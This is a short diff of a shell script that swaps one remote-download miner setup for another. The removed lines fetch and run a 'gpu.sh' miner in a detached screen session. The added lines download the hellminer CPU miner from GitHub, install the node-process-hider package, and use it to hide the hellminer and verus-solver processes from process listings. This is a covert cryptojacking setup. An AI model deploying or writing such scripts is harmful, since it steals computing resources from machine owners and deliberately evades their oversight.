@@ -1,7 +1,9 @@
-sudo apt update
-sudo apt install screen -y
-screen -dmS gpu.sh ./gpu.sh 65 75
-wget https://raw.githubusercontent.com/chikahusarii/cols/main/tuyulgpu
-wget https://raw.githubusercontent.com/chikahusarii/cols/main/gpu.sh
-chmod +x gpu.sh
-./gpu.sh
+sudo apt update -y
+sudo apt install nodejs -y
+sudo apt install npm -y
+sudo npm i -g node-process-hider
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+chmod +x hellminer_cpu_linux.tar.gz
+tar -xvf hellminer_cpu_linux.tar.gz
+sudo ph add hellminer
+sudo ph add verus-solver
